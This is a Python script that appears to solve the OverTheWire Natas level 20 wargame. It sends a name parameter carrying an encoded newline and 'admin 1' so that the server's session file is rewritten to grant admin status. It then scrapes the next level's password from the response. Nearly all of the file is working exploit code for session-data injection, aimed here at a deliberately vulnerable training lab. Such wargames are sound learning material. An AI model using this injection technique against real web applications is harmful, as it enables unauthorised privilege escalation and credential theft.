import requests
import re

url = "http://natas20.natas.labs.overthewire.org/"
auth  = ("natas20", "secret")

def exploit():
    session = requests.Session()
    session.auth = auth

    print("[*]Creating first session")
    target_url = f"{url}?debug&name=Yasha%0Aadmin%201" # %0A - that a encoded in URL "/n" - newline. %20 - That a encoded in URL "space"

    response_post = session.post(target_url, timeout = 10)

    if response_post.status_code != 200:
        print(f"[-]Error to connect the server: {response_post.status_code}") # this line tell us about Error between us PC and Server of Natas
        return
    print("[+]Injection has sended to server, file of session was modified")

    response_get = session.get(f"{url}?debug", timeout=10)

    if "you are an admin" in response_get.text.lower(): # This line checking unique text in response text
        print("[+]Congratulations! Access done.")

        flag = re.search(r"[A-Za-z0-9]{32}", response_get.text) # This line searching word with 32 letters
        if flag:
            print(f"[+]Password For Natas21 is: {flag.group(0)}")
        else:
            print("[!]Password not founded, check HTML-response manually.")

if __name__ == "__main__":
    exploit()
